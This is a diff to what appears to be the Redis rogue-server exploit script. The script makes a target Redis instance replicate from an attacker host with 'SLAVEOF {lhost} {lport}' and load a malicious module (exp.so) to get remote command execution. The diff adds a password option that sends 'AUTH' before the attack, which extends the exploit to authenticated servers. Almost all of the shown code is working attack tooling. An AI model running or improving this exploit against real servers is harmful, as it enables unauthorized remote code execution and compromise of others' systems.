@@ -15,7 +15,7 @@ BANNER = """______         _ _      ______                         _____
 \_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                      __/ |                                            
                                     |___/                                             
-@copyright n0b0dy @ r3kapig
+@copyright n0b0dy @ r3kapig @ Alvin Smith
 """
 
 def encode_cmd_arr(arr):
@@ -157,9 +157,11 @@ def cleanup(remote):
     info("Unload module...")
     remote.do("MODULE UNLOAD system")
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, auth):
     # expolit
     remote = Remote(rhost, rport)
+    if (auth):
+        remote.do(f"AUTH {auth}")
     info("Setting master...")
     remote.do(f"SLAVEOF {lhost} {lport}")
     info("Setting dbfilename...")
@@ -201,6 +203,8 @@ if __name__ == '__main__':
     parser.add_option("--exp", dest="exp", type="string",
             help="Redis Module to load, default exp.so", default="exp.so",
             metavar="EXP_FILE")
+    parser.add_option("-a", "--auth", dest="auth", type="string",
+            help="Password to use when connecting to the server")
     parser.add_option("-v", "--verbose", action="store_true", default=False,
             help="Show full data stream")
 
@@ -216,6 +220,6 @@ if __name__ == '__main__':
     info(f"TARGET {options.rh}:{options.rp}")
     info(f"SERVER {options.lh}:{options.lp}")
     try:
-        runserver(options.rh, options.rp, options.lh, options.lp)
+        runserver(options.rh, options.rp, options.lh, options.lp, options.auth)
     except Exception as e:
         error(repr(e))
